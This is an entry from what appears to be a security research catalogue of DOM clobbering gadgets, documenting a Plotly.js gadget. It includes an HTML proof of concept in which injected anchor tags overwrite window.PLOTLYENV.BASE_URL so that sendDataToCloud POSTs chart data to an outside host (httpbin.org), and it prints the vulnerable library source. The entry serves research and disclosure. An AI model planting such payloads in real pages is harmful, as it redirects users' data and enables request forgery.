---
description: Plotly.js is a standalone Javascript data visualization library, and it also powers the Python and R modules named plotly in those respective ecosystems (referred to as [Plotly.py](https://plotly.com/python/) and [Plotly.R](https://plotly.com/r/)).
github: plotly/plotly.js
gadgets:
  Latest:
    authors:
      - github:jackfromeast
      - github:ishmeals
    tags:
      - chrome-browser
      - safari-browser
      - img-tag
      - src-attr
      - name-attr
      - before-lib-load
    pocs:
      - description: The Plooty.js library uses the `window.PLOTLYENV.BASE_URL` value as an URL reference to [sendDataToCloud](https://github.com/plotly/plotly.js/blob/b5603685a8e8ea4ada6d97d4af3fc60ec470b3cb/src/plots/plots.js#L203) using a POST `<form>`. This can be used to perform a [Cross-site request forgery](https://portswigger.net/web-security/csrf) (CSRF) attack.
        code: |
          <!-- user input -->
          <a id="PLOTLYENV"></a>
          <a id="PLOTLYENV" name="BASE_URL" href="https://httpbin.org/anything?"></a>

          <div id="gd"></div>
          <script src="https://cdn.plot.ly/plotly-3.0.1.min.js"></script>
          <script>
              Plotly.newPlot("gd", /* JSON object */ {
                  "data": [{ "y": [1, 2, 3] }],
                  "layout": { "width": 600, "height": 400}
              })
              Plotly.Plots.sendDataToCloud(gd);
          </script>
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/plotly/plotly.js/blob/021289c7607c3cebd49de016db26a51dbe1fb3b4/src/plots/plots.js#L204">https://github.com/plotly/plotly.js/blob/021289c7607c3cebd49de016db26a51dbe1fb3b4/src/plots/plots.js#L204</a>

      ```javascript
      plots.sendDataToCloud = function(gd) {
          var baseUrl = (window.PLOTLYENV || {}).BASE_URL || gd._context.plotlyServerURL;
          if(!baseUrl) return;

          gd.emit('plotly_beforeexport');

          var hiddenformDiv = d3.select(gd)
              .append('div')
              .attr('id', 'hiddenform')
              .style('display', 'none');

          var hiddenform = hiddenformDiv
              .append('form')
              .attr({
                  action: baseUrl + '/external',
                  method: 'post',
                  target: '_blank'
              });

          var hiddenformInput = hiddenform
              .append('input')
              .attr({
                  type: 'text',
                  name: 'data'
              });

          hiddenformInput.node().value = plots.graphJson(gd, false, 'keepdata');
          hiddenform.node().submit();
          hiddenformDiv.remove();

          gd.emit('plotly_afterexport');
          return false;
      };
      ```
    links:
      - https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/plotly.js.md
      - https://jackfromeast.github.io/assets/DOMinoEffect.pdf
---
